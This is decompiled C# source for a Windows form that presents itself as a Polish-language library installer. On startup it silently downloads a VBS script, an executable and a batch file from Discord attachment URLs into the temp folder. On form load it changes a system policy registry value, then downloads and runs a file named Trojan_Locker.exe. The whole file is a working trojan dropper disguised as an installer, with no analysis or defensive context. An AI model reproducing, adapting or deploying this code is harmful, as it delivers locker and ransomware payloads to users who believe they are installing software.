using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Instal;

public class Form1 : Form
{
	private IContainer components;

	private Panel panel1;

	private Panel panel2;

	private Timer timer1;

	private Label label1;

	private Label label2;

	private Timer timer2;

	private Button button1;

	private RadioButton radioButton1;

	public Form1()
	{
		InitializeComponent();
		WebClient webClient = new WebClient();
		Uri address = new Uri("https://cdn.discordapp.com/attachments/974975651968843786/977318441163821086/ransom_voice.vbs", UriKind.Absolute);
		webClient.DownloadFile(address, Path.GetTempPath() + "\\ransom_voice.vbs");
		help();
		bat();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Panel obj = panel2;
		((Control)obj).set_Width(((Control)obj).get_Width() + 2);
		if (((Control)panel2).get_Width() >= 915)
		{
			timer1.Stop();
		}
	}

	private void szyforwanie()
	{
	}

	private void help()
	{
		WebClient webClient = new WebClient();
		Uri address = new Uri("https://cdn.discordapp.com/attachments/977655353539969056/978304728553373796/hellp.exe", UriKind.Absolute);
		webClient.DownloadFile(address, Path.GetTempPath() + "\\hellp.exe");
	}

	private void bat()
	{
		WebClient webClient = new WebClient();
		Uri address = new Uri("https://cdn.discordapp.com/attachments/977655353539969056/980139883697942618/pomoc.bat", UriKind.Absolute);
		webClient.DownloadFile(address, Path.GetTempPath() + "\\pomoc.bat");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
		WebClient webClient = new WebClient();
		Uri address = new Uri("https://cdn.discordapp.com/attachments/985938133977813124/988389454194548746/Trojan_Locker.exe", UriKind.Absolute);
		webClient.DownloadFile(address, Path.GetTempPath() + "\\Trojan_Locker.exe");
		Process.Start(Path.GetTempPath() + "\\Trojan_Locker.exe");
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("GLHF", "BY:3godziny", (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	private void radioButton1_CheckedChanged_1(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0179: Unknown result type (might be due to invalid IL or missing references)
		//IL_0183: Expected O, but got Unknown
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Expected O, but got Unknown
		//IL_02e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ef: Expected O, but got Unknown
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b2: Expected O, but got Unknown
		//IL_04f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0500: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		panel1 = new Panel();
		panel2 = new Panel();
		timer1 = new Timer(components);
		label1 = new Label();
		label2 = new Label();
		timer2 = new Timer(components);
		button1 = new Button();
		radioButton1 = new RadioButton();
		((Control)this).SuspendLayout();
		((Control)panel1).set_Location(new Point(12, 354));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(915, 36));
		((Control)panel1).set_TabIndex(0);
		((Control)panel2).set_BackColor(Color.DodgerBlue);
		((Control)panel2).set_Location(new Point(12, 351));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(94, 39));
		((Control)panel2).set_TabIndex(1);
		timer1.set_Enabled(true);
		timer1.set_Interval(15);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Yu Gothic UI", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.DodgerBlue);
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(248, 65));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Instalator ");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Yu Gothic UI", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.DodgerBlue);
		((Control)label2).set_Location(new Point(17, 94));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(846, 32));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Instalacja Bibliotek i pobocznych plików poczekaj chwilę i kliknij : Gotowe ! \"");
		((Control)label2).add_Click((EventHandler)label2_Click);
		timer2.set_Enabled(true);
		timer2.set_Interval(4);
		((Control)button1).set_BackColor(Color.DodgerBlue);
		((Control)button1).set_Font(new Font("Yu Gothic UI", 12f, (FontStyle)1));
		((Control)button1).set_ForeColor(Color.FromArgb(45, 45, 45));
		((Control)button1).set_Location(new Point(717, 278));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(172, 60));
		((Control)button1).set_TabIndex(5);
		((Control)button1).set_Text("Gotowe !");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)radioButton1).set_AutoSize(true);
		((Control)radioButton1).set_Font(new Font("Microsoft Sans Serif", 11f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)radioButton1).set_Location(new Point(609, 308));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(102, 30));
		((Control)radioButton1).set_TabIndex(6);
		radioButton1.set_TabStop(true);
		((Control)radioButton1).set_Text("CLICK");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		radioButton1.add_CheckedChanged((EventHandler)radioButton1_CheckedChanged_1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(45, 45, 45));
		((Form)this).set_ClientSize(new Size(950, 415));
		((Control)this).get_Controls().Add((Control)(object)radioButton1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
